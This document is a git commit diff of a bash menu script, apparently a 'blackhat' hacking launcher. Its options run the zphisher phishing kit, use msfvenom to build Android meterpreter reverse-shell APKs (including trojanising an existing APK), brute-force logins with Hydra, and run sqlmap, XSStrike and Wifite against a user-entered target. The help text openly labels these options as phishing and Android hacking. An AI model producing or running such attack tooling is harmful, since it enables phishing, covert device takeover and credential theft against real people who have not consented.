e95fe0c79f9467f72808b0ea9ba32bdf81f7bc39
Root control 💀👑 <zalaffouad37@gmail.com>
2025-09-07 14:00:13 +0300

    Add files via upload

--- tool.sh
+++ tool.sh
@@ -1,5 +1,6 @@
-banerelaraby(){
+#!/bin/bash
 
+banerelaraby(){
 
 cat <<'EOF'
          ██╗██████╗  ██████╗     ███████╗ ██████╗ ██╗   ██╗ █████╗ ██████╗ 
@@ -28,94 +29,115 @@ echo " 11- Trying SQLMAP ON TARGET                    - "
 echo " 12- HELP                                       - "
 echo " 13- UPDATE AND UPGRADE YOUR LINUX              - "
 echo " 14- CONTACT WITH ME                            - "
+echo " 15- INSTALL XSStrike                           - "
+echo " 16- RUN XSStrike                               - "
+echo " 17- INSTALL Nikto                              - "
+echo " 18- RUN Nikto                                  - "
+echo " 19- INSTALL Hydra                              - "
+echo " 20- RUN Hydra                                  - "
+echo " 21- INSTALL theHarvester                       - "
+echo " 22- RUN theHarvester                           - "
+echo " 23- INSTALL Wifite                             - "
+echo " 24- RUN Wifite                                 - "
+echo " 25- RUN WHOIS Lookup                           - "
+echo " 26- INSTALL Gobuster                           - "
+echo " 27- RUN Gobuster                               - "
+echo " 28- INSTALL John the Ripper                    - "
+echo " 29- RUN John the Ripper                        - "
+echo " 30- AUTO-INSTALL ALL TOOLS                     - "
 echo " ------------------------------------------------- "
 echo " enter the number of option you want to run  :   "
 }
+
 author(){
 echo " ----------------------------- "
-echo " this tool maded by el3araby "
+echo " this tool maded by fouad "
 echo " I LOVE U "
 echo " ----------------------------- "
 }
+
 el3araby(){
 read choice
 
 case $choice in
-	1)
-		echo "runing zphisher"
-		cd zphisher && bash zphisher.sh
-		;;
-	2)
-		echo "rnning ELARABYGBS"
-		cd ELARABYGBS && bash el3araby.sh
-		;;
-	3)
-		echo "makeing a payload"
-		read -p "ENTER your LHOST " LHOST
-		read -p " enter your LPORT : " LPORT
-		read -p " enter your apk final name : " NAME
-		echo " please wait "
-		msfvenom -p android/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $NAME.apk
-		;;
-	4)
-		echo "makeing a payload"
-		read -p "ENTER THE PATH OF ORIGINAL APK" ORG
-                read -p "ENTER your LHOST " LHOST
-                read -p "ENTER your LPORT : " LPORT
-                read -p "ENTER your apk final name : " NAME
-		msfvenom -x $ORG -p android/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $NAME.apk
-		;;
-	5)
-		echo "runing metasploit"
-		msfconsole
-		;;
-	6)
-		echo "downloading zphisher"
-		git clone https://github.com/htr-tech/zphisher.git
-		;;
-	7)
-		echo "downloading ELARABYGBS"
-		git clone https://github.com/b7of/ELARABYGBS.git
-		;;
-	8)
-		read -p "ENTER THE IP OR DOMAIN " IP
-		nmap -T4 -A -v $IP
-		;;
-	9)
-		echo"DOWNLOADING HACKINGTOOL"
-		git clone https://github.com/Z4nzu/hackingtool.git && chmod -R 755 hackingtool && cd hackingtool && sudo bash install.sh && sudo hackingtool
-		;;
-	10) 
-		echo"RUNING HACKINGTOOL"
-		sudo hackingtool
-		;;
-	11) 
-		read -p "ENTER YOUR TARGET LINK : " TARGET
-		sqlmap -u $TARGET --dbs --batch
-		;;
-	12)
-		echo" YOU CAN USE MY TOOL BY WRITE A NUMBER OF THE TASK YOU WANT "
-		echo" 1 : FOR PHISHING ATTACK & 2 : FOR LOCATION BY LINK & 3,4 FOR HACK ANDROID BY APK"
-		echo" 5 : TO RUN METASPLOIT & 6,7,9 TO DOWNLOAD TOOLS & 8 TO USE NMAP ON IP OR DOMAIN"
-		echo" 10 : TO RUN HACKING TOOL ( A MULTITASK TOOL ) , 11 : TO RUN SQLMAP "
-		;;
-	13) 
-		echo "UPDATE AND UPGRADING"
-		sudo apt-get update -y && sudo apt-get upgrade -y
-		;;
-	14)
-		echo " ENG : EL3ARABY & FOUAD "
-		echo " github : https://github.com/loals2sa "
-		echo " instagram : https://instagram.com/1.pvl "
-		echo " telegram : @blackhatfouad"
-		;;
-	*)
-		echo" invaild option enter the number from 1 to 6 "
-		echo" good bye "
-		;;
+	1) echo "Running zphisher"; cd zphisher && bash zphisher.sh ;;
+	2) echo "Running ELARABYGBS"; cd ELARABYGBS && bash el3araby.sh ;;
+	3) echo "Making a payload"; 
+	   read -p "ENTER LHOST: " LHOST
+	   read -p "ENTER LPORT: " LPORT
+	   read -p "ENTER apk final name: " NAME
+	   msfvenom -p android/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $NAME.apk ;;
+	4) echo "Making payload with original APK"; 
+	   read -p "ENTER APK path: " ORG
+	   read -p "ENTER LHOST: " LHOST
+	   read -p "ENTER LPORT: " LPORT
+	   read -p "ENTER final name: " NAME
+	   msfvenom -x $ORG -p android/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $NAME.apk ;;
+	5) echo "Running metasploit"; msfconsole ;;
+	6) echo "Downloading zphisher"; git clone https://github.com/htr-tech/zphisher.git ;;
+	7) echo "Downloading ELARABYGBS"; git clone https://github.com/b7of/ELARABYGBS.git ;;
+	8) read -p "ENTER IP or DOMAIN: " IP; nmap -T4 -A -v $IP ;;
+	9) echo "Downloading HACKINGTOOL"; 
+	   git clone https://github.com/Z4nzu/hackingtool.git && chmod -R 755 hackingtool && cd hackingtool && sudo bash install.sh && sudo hackingtool ;;
+	10) echo "Running HACKINGTOOL"; sudo hackingtool ;;
+	11) read -p "ENTER TARGET LINK: " TARGET; sqlmap -u $TARGET --dbs --batch ;;
+	12) echo "HELP MENU:
+	   - 1-2: phishing/location
+	   - 3-4: android payloads
+	   - 5: metasploit
+	   - 6-7-9: download tools
+	   - 8: nmap scan
+	   - 10: hackingtool
+	   - 11: sqlmap
+	   - 15-16: XSStrike
+	   - 17-18: Nikto
+	   - 19-20: Hydra
+	   - 21-22: theHarvester
+	   - 23-24: Wifite
+	   - 25: WHOIS
+	   - 26-27: Gobuster
+	   - 28-29: John the Ripper
+	   - 30: Auto install all tools";;
+	13) echo "Updating system"; sudo apt-get update -y && sudo apt-get upgrade -y ;;
+	14) echo "ENG : EL3ARABY & FOUAD
+	   github : https://github.com/loals2sa
+	   instagram : https://instagram.com/1.pvl
+	   telegram : @blackhatfouad" ;;
+	15) echo "Installing XSStrike"; git clone https://github.com/s0md3v/XSStrike.git && cd XSStrike && pip3 install -r requirements.txt ;;
+	16) echo "Running XSStrike"; read -p "ENTER TARGET URL: " URL; cd XSStrike && python3 xsstrike.py -u $URL ;;
+	17) echo "Installing Nikto"; sudo apt-get install nikto -y ;;
+	18) echo "Running Nikto"; read -p "ENTER TARGET URL: " URL; nikto -h $URL ;;
+	19) echo "Installing Hydra"; sudo apt-get install hydra -y ;;
+	20) echo "Running Hydra"; 
+	   read -p "ENTER TARGET: " TARGET
+	   read -p "ENTER SERVICE (ssh, ftp..): " SERVICE
+	   read -p "ENTER USERNAME: " USER
+	   read -p "ENTER PASSWORD LIST: " PASSLIST
+	   hydra -l $USER -P $PASSLIST $TARGET $SERVICE ;;
+	21) echo "Installing theHarvester"; sudo apt-get install theharvester -y ;;
+	22) echo "Running theHarvester"; read -p "ENTER DOMAIN: " DOMAIN; theHarvester -d $DOMAIN -l 500 -b google ;;
+	23) echo "Installing Wifite"; sudo apt-get install wifite -y ;;
+	24) echo "Running Wifite"; sudo wifite ;;
+	25) echo "WHOIS Lookup"; read -p "ENTER DOMAIN: " DOMAIN; whois $DOMAIN ;;
+	26) echo "Installing Gobuster"; sudo apt-get install gobuster -y ;;
+	27) echo "Running Gobuster"; 
+	   read -p "ENTER DOMAIN: " DOMAIN
+	   read -p "ENTER WORDLIST PATH: " WORDLIST
+	   gobuster dir -u http://$DOMAIN -w $WORDLIST ;;
+	28) echo "Installing John the Ripper"; sudo apt-get install john -y ;;
+	29) echo "Running John the Ripper"; read -p "ENTER PASSWORD FILE PATH: " FILE; john $FILE ;;
+	30) echo "Auto installing all tools..."
+	    sudo apt-get install -y nikto hydra theharvester wifite gobuster john
+	    git clone https://github.com/htr-tech/zphisher.git
+	    git clone https://github.com/b7of/ELARABYGBS.git
+	    git clone https://github.com/Z4nzu/hackingtool.git && chmod -R 755 hackingtool && cd hackingtool && sudo bash install.sh
+	    git clone https://github.com/s0md3v/XSStrike.git && cd XSStrike && pip3 install -r requirements.txt
+	    echo "All tools installed." ;;
+	*) echo "Invalid option (1-30)";;
 esac
 }
 
+# تشغيل القائمة
 banerelaraby
 el3araby
-author
+
